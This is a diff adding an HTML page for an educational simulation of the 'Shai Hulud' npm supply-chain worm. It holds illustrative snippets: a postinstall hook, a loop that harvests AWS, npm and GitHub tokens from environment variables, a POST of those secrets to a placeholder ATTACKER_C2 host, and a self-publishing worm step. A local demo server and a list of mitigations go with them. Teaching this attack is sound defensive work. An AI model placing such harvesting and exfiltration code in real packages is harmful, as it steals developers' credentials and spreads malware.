@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shai Hulud — Supply Chain Attack Demo</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'SF Mono', 'Fira Code', monospace; background: #0a0a0a; color: #e0e0e0; min-height: 100vh; }
+    .container { max-width: 960px; margin: 0 auto; padding: 2rem; }
+
+    h1 { color: #ff6b35; font-size: 1.8rem; margin-bottom: 0.25rem; }
+    .subtitle { color: #888; margin-bottom: 2rem; font-size: 0.85rem; }
+    .subtitle a { color: #ff6b35; }
+
+    .phase { background: #141414; border: 1px solid #2a2a2a; border-radius: 8px; padding: 1.5rem; margin-bottom: 1rem; }
+    .phase h2 { font-size: 1rem; margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem; }
+    .phase h2 .num { background: #ff6b35; color: #000; width: 24px; height: 24px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: bold; }
+    .phase p { color: #999; font-size: 0.8rem; line-height: 1.5; margin-bottom: 1rem; }
+
+    pre { background: #1a1a1a; border: 1px solid #333; border-radius: 4px; padding: 1rem; overflow-x: auto; font-size: 0.78rem; line-height: 1.6; }
+    pre .comment { color: #555; }
+    pre .string { color: #98c379; }
+    pre .keyword { color: #c678dd; }
+    pre .danger { color: #e06c75; }
+
+    button { background: #ff6b35; color: #000; border: none; padding: 0.6rem 1.5rem; border-radius: 4px; font-family: inherit; font-weight: bold; font-size: 0.85rem; cursor: pointer; transition: 0.15s; }
+    button:hover { background: #ff8855; }
+    button:disabled { background: #444; color: #888; cursor: not-allowed; }
+    button.reset { background: #333; color: #aaa; }
+    button.reset:hover { background: #444; }
+
+    .output { margin-top: 1rem; }
+    .output pre { border-color: #ff6b3544; }
+
+    .loot-card { background: #1c0a0a; border: 1px solid #ff6b3555; border-radius: 4px; padding: 1rem; margin-top: 0.5rem; }
+    .loot-card .label { color: #ff6b35; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; }
+    .loot-card .value { color: #e06c75; font-size: 0.8rem; margin-top: 0.25rem; word-break: break-all; }
+
+    .status { display: inline-block; padding: 0.2rem 0.6rem; border-radius: 3px; font-size: 0.7rem; font-weight: bold; }
+    .status.idle { background: #333; color: #888; }
+    .status.running { background: #ff6b3533; color: #ff6b35; }
+    .status.done { background: #98c37933; color: #98c379; }
+    .status.error { background: #e06c7533; color: #e06c75; }
+
+    .flow { display: flex; align-items: center; gap: 0.5rem; margin: 1.5rem 0; flex-wrap: wrap; }
+    .flow .box { background: #1a1a1a; border: 1px solid #333; border-radius: 4px; padding: 0.5rem 1rem; font-size: 0.75rem; text-align: center; }
+    .flow .box.victim { border-color: #61afef; color: #61afef; }
+    .flow .box.malware { border-color: #e06c75; color: #e06c75; }
+    .flow .box.attacker { border-color: #ff6b35; color: #ff6b35; }
+    .flow .arrow { color: #555; font-size: 1.2rem; }
+
+    .warn { background: #2a1a00; border: 1px solid #ff6b3555; border-radius: 4px; padding: 1rem; margin-bottom: 2rem; font-size: 0.8rem; color: #ffaa55; line-height: 1.5; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>SHAI HULUD</h1>
+    <p class="subtitle">
+      Interactive demo of the first self-propagating npm supply chain attack (Sep 2025)
+      &mdash; <a href="https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack" target="_blank">Wiz Research</a>
+    </p>
+
+    <div class="warn">
+      This is an educational simulation. All secrets are fake. The "attacker server" runs locally on port 4444.
+      No real credentials are harvested or exfiltrated.
+    </div>
+
+    <!-- Attack flow diagram -->
+    <div class="flow">
+      <div class="box victim">npm install</div>
+      <div class="arrow">&rarr;</div>
+      <div class="box malware">postinstall hook</div>
+      <div class="arrow">&rarr;</div>
+      <div class="box malware">harvest env secrets</div>
+      <div class="arrow">&rarr;</div>
+      <div class="box attacker">exfil to C2</div>
+      <div class="arrow">&rarr;</div>
+      <div class="box attacker">npm token? &rarr; worm</div>
+    </div>
+
+    <!-- Phase 1: The innocent package -->
+    <div class="phase">
+      <h2><span class="num">1</span> The Trojan Package</h2>
+      <p>
+        A legitimate-looking package (<code>@benign-looking/color-utils</code>) contains a
+        <code>postinstall</code> script in its <code>package.json</code>. This runs automatically
+        on <code>npm install</code> — no user interaction needed.
+      </p>
+      <pre><code>{
+  "name": "<span class="string">@benign-looking/color-utils</span>",
+  "version": "<span class="string">2.1.4</span>",
+  "scripts": {
+    "<span class="danger">postinstall</span>": "<span class="danger">node scripts/postinstall.js</span>"
+  }
+}</code></pre>
+    </div>
+
+    <!-- Phase 2: Secret harvesting -->
+    <div class="phase">
+      <h2><span class="num">2</span> Secret Harvesting</h2>
+      <p>
+        The postinstall script scans <code>process.env</code> for anything matching secret patterns:
+        AWS keys, npm/GitHub tokens, database URLs, API keys. In the real attack, TruffleHog was
+        also used to scan the filesystem.
+      </p>
+      <pre><code><span class="keyword">const</span> SECRET_PATTERNS = [
+  <span class="string">/^AWS_/</span>, <span class="string">/^NPM_/</span>, <span class="string">/^GITHUB_/</span>,
+  <span class="string">/TOKEN/i</span>, <span class="string">/SECRET/i</span>, <span class="string">/^DATABASE_URL$/</span>
+];
+
+<span class="comment">// Scan every env var</span>
+<span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> Object.entries(process.env)) {
+  <span class="keyword">if</span> (SECRET_PATTERNS.some(p => p.test(key)))
+    <span class="danger">found[key] = value;</span>  <span class="comment">// gotcha</span>
+}</code></pre>
+    </div>
+
+    <!-- Phase 3: Exfiltration -->
+    <div class="phase">
+      <h2><span class="num">3</span> Exfiltration &amp; Propagation</h2>
+      <p>
+        Harvested secrets are sent to an attacker-controlled server. In the real attack, secrets were
+        double-base64 encoded and pushed to public GitHub repos named "Shai-Hulud". If an npm token
+        was found, the malware used it to publish poisoned versions of <em>other</em> packages —
+        making it a self-propagating worm.
+      </p>
+      <pre><code><span class="comment">// Exfiltrate</span>
+http.request({ host: <span class="danger">ATTACKER_C2</span>, path: "<span class="string">/exfil</span>", method: "<span class="string">POST</span>" })
+  .write(JSON.stringify({ hostname, <span class="danger">secrets</span>, npmToken, githubToken }));
+
+<span class="comment">// Worm: if npm token found, publish malicious versions of accessible packages</span>
+<span class="keyword">if</span> (secrets.NPM_TOKEN) {
+  <span class="danger">exec(`npm publish --tag latest`)</span>;  <span class="comment">// infect more packages</span>
+}</code></pre>
+    </div>
+
+    <!-- Interactive simulation -->
+    <div class="phase">
+      <h2><span class="num">!</span> Live Simulation</h2>
+      <p>
+        Click below to run the simulated attack. The postinstall script will harvest fake secrets
+        from this app's environment and send them to the local attacker server (port 4444).
+      </p>
+
+      <div style="display: flex; gap: 0.75rem; align-items: center; flex-wrap: wrap;">
+        <button id="btn-attack" onclick="runAttack()">Run npm install (trigger postinstall)</button>
+        <button id="btn-check" onclick="checkLoot()" class="reset">Check Attacker's Loot</button>
+        <button onclick="resetLoot()" class="reset">Reset</button>
+        <span id="status" class="status idle">idle</span>
+      </div>
+
+      <div id="sim-output" class="output" style="display:none;">
+        <pre id="sim-log"></pre>
+      </div>
+
+      <div id="loot-output" style="display:none; margin-top:1rem;"></div>
+    </div>
+
+    <!-- Mitigations -->
+    <div class="phase">
+      <h2><span class="num">&check;</span> Mitigations</h2>
+      <pre><code><span class="comment"># Disable postinstall scripts globally</span>
+npm config set ignore-scripts true
+
+<span class="comment"># Use --ignore-scripts per install</span>
+npm install --ignore-scripts
+
+<span class="comment"># Audit before installing</span>
+npm audit
+
+<span class="comment"># Use lockfiles + pin exact versions</span>
+npm ci  <span class="comment"># instead of npm install</span>
+
+<span class="comment"># Restrict token scope & use short-lived tokens</span>
+<span class="comment"># Enable npm 2FA on publish</span>
+<span class="comment"># Use tools like Socket.dev to detect risky packages</span></code></pre>
+    </div>
+  </div>
+
+  <script>
+    const statusEl = document.getElementById("status");
+    const simOutput = document.getElementById("sim-output");
+    const simLog = document.getElementById("sim-log");
+    const lootOutput = document.getElementById("loot-output");
+
+    function setStatus(state, text) {
+      statusEl.className = "status " + state;
+      statusEl.textContent = text || state;
+    }
+
+    async function runAttack() {
+      document.getElementById("btn-attack").disabled = true;
+      setStatus("running", "executing postinstall...");
+      simOutput.style.display = "block";
+      simLog.textContent = "$ npm install @benign-looking/color-utils@2.1.4\n\nresolving packages...\nadded 1 package in 0.4s\n\n";
+
+      // Simulate typing delay
+      await sleep(800);
+      simLog.textContent += "Running postinstall for @benign-looking/color-utils@2.1.4...\n";
+      await sleep(600);
+
+      try {
+        const res = await fetch("/api/simulate", { method: "POST" });
+        const data = await res.json();
+
+        if (data.success) {
+          simLog.textContent += "[postinstall] dependencies configured successfully\n";
+          simLog.textContent += "[postinstall] asset optimization complete\n\n";
+          simLog.textContent += "# ^ Those innocent-looking logs hide the real activity:\n";
+          simLog.textContent += "#   - Environment secrets harvested\n";
+          simLog.textContent += "#   - Exfiltrated to attacker C2 (localhost:4444)\n";
+          simLog.textContent += "#   - NPM token found → worm propagation possible\n";
+          setStatus("done", "secrets exfiltrated!");
+        } else {
+          simLog.textContent += "ERROR: " + data.output + "\n";
+          simLog.textContent += "\n# Make sure attacker server is running: npm run attacker\n";
+          setStatus("error", "failed");
+        }
+      } catch (e) {
+        simLog.textContent += "ERROR: " + e.message + "\n";
+        simLog.textContent += "\n# Make sure attacker server is running: npm run attacker\n";
+        setStatus("error", "failed");
+      }
+
+      document.getElementById("btn-attack").disabled = false;
+    }
+
+    async function checkLoot() {
+      try {
+        const res = await fetch("/api/attacker-loot");
+        const data = await res.json();
+
+        if (data.error) {
+          lootOutput.innerHTML = `<div class="loot-card"><div class="label">Error</div><div class="value">${data.error}</div></div>`;
+        } else if (data.length === 0) {
+          lootOutput.innerHTML = `<div class="loot-card"><div class="label">No loot yet</div><div class="value">Run the simulation first.</div></div>`;
+        } else {
+          lootOutput.innerHTML = data.map(entry => `
+            <div class="loot-card">
+              <div class="label">Exfiltrated from: ${esc(entry.hostname)} at ${esc(entry.timestamp)}</div>
+              ${Object.entries(entry.secrets || {}).map(([k, v]) => `
+                <div class="value"><strong>${esc(k)}:</strong> ${esc(v)}</div>
+              `).join("")}
+              <div class="value" style="margin-top:0.5rem; color: #ff6b35;">
+                <strong>NPM token found:</strong> ${entry.npmToken ? "YES → worm can propagate!" : "no"}
+              </div>
+            </div>
+          `).join("");
+        }
+        lootOutput.style.display = "block";
+      } catch (e) {
+        lootOutput.innerHTML = `<div class="loot-card"><div class="label">Error</div><div class="value">${e.message}</div></div>`;
+        lootOutput.style.display = "block";
+      }
+    }
+
+    async function resetLoot() {
+      try { await fetch("http://localhost:4444/reset", { method: "POST" }); } catch {}
+      lootOutput.style.display = "none";
+      simOutput.style.display = "none";
+      setStatus("idle");
+    }
+
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+    function esc(s) { const d = document.createElement("div"); d.textContent = s; return d.innerHTML; }
+  </script>
+</body>
+</html>
